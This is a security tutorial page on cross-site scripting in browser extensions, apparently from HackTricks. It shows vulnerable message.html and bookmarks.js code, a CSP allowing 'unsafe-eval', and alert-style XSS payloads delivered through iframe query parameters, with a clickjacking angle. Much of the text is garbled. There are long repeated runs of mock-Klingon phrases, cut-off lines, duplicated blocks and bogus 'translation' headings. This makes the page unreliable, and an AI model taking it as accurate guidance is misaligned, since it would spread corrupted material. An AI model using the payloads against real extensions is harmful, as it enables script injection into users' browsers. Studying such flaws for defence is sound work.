# BrowExt - XSS Example

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Cross-Site Scripting (XSS) through Iframe

In this setup, a **content script** is implemented to instantiate an Iframe, incorporating a URL with query parameters as the source of the Iframe:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
**`message.html`** is a publicly accessible HTML page that is intended to dynamically add content to the document body based on the parameters in the URL.
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
**XSS payload**-eSbe'chugh vItlhutlh 'ej 'oH 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'oH Iframe's source 'e' vItlhutlh 'ej 'o
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
An overly permissive Content Security Policy such as:

**Klingon Translation:**

**ghobtaHvIS Content Security Policy**:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; media-src 'self'; frame-src 'self'; child-src 'self'; form-action 'self'; frame-ancestors 'self';">
```

**Translation Explanation:**

**ghobtaHvIS Content Security Policy**:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; media-src 'self'; frame-src 'self'; child-src 'self'; form-action 'self'; frame-ancestors 'self';">
```

**Explanation:**

An overly permissive Content Security Policy allows various potentially dangerous actions, such as executing inline scripts and evaluating unsafe code. This can lead to cross-site scripting (XSS) attacks and other security vulnerabilities. It is important to configure a strict Content Security Policy to mitigate these risks.
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
**Klingon Translation:**

```
allows the execution of JavaScript, making the system vulnerable to XSS attacks.

An alternative approach to provoke the XSS involves creating an Iframe element and setting its source to include the harmful script as the `content` parameter:
```

**Klingon Translation:**

```
JavaScript vItlhutlh, vItlhutlh XSS tIq 'ej vItlhutlh.

XSS provokem approach vItlhutlh Iframe 'ej 'e' vItlhutlh script vItlhutlh 'ej 'e' content parameter vItlhutlh vItlhutlh:
```
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

This example was taken from the [original post writeup](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

The core issue arises from a DOM-based Cross-site Scripting (XSS) vulnerability located in **`/html/bookmarks.html`**. The problematic JavaScript, part of **`bookmarks.js`**, is detailed below:

## DOM-based XSS + ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vItlhutlhDI' 'ej ClickJacking

vIt
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
**browext-xss-example.md**

```
# Browext XSS Example

This snippet fetches the **value** from the **`txtName`** input field and uses **string concatenation to generate HTML**, which is then appended to the DOM using jQuery‚Äôs `.append()` function.

Typically, the Chrome extension's Content Security Policy (CSP) would prevent such vulnerabilities. However, due to **CSP relaxation with ‚Äòunsafe-eval‚Äô** and the use of jQuery‚Äôs DOM manipulation methods (which employ [`globalEval()`](https://api.jquery.com/jquery.globaleval/) to pass scripts to [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) upon DOM insertion), exploitation is still possible.

While this vulnerability is significant, its exploitation is usually contingent on user interaction: visiting the page, entering an XSS payload, and activating the ‚ÄúAdd‚Äù button.

To enhance this vulnerability, a secondary **clickjacking** vulnerability is exploited. The Chrome extension's manifest showcases an extensive `web_accessible_resources` policy:
```

**browext-xss-example.md**

```
# Browext XSS Example

vItlhutlh vItlhutlh **value** **`txtName`** input field vItlhutlh **string concatenation to generate HTML** vItlhutlh, 'ej jQuery‚Äôs `.append()` function vItlhutlh DOM vItlhutlh.

Typically, Chrome extension's Content Security Policy (CSP) vItlhutlh prevent vulnerabilities. However, **CSP relaxation with ‚Äòunsafe-eval‚Äô** 'ej jQuery‚Äôs DOM manipulation methods (which employ [`globalEval()`](https://api.jquery.com/jquery.globaleval/) to pass scripts to [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) upon DOM insertion), exploitation vItlhutlh possible.

vaj vulnerability vItlhutlh, 'ach exploitation usually contingent user interaction: visiting page, entering XSS payload, 'ej activating ‚ÄúAdd‚Äù button.

vaj vulnerability, **clickjacking** vulnerability vItlhutlh exploited. Chrome extension's manifest showcases extensive `web_accessible_resources` policy:
```
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
